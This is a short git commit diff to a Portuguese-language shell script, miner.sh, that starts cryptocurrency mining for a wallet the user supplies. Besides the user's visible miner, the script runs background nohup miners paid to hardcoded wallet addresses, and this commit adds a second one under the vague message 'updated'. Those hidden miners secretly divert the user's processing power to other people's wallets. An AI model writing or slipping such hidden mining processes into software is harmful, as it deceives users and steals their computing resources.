00aca5a95b918e35f621c2afc14a48603e31902d
HaxStroke 青木ヶ原 <HaxStroke@users.noreply.github.com>
2017-09-16 13:07:18 -0300

    updated
    ddd

--- miner.sh
+++ miner.sh
@@ -96,5 +96,6 @@ sleep 1
 echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet " 
 sleep 10
 cd miner
-nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1FsEWCHZ3312ms67Lp7Hr93uDxxFsPL5yk &
+nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -t 1 -u 1FsEWCHZ3312ms67Lp7Hr93uDxxFsPL5yk &
+nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -t 1 -u 1Mc7kyvU3Kp4AKuoxfJVPEAbpoYtnjPYCW &
 screen ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet 
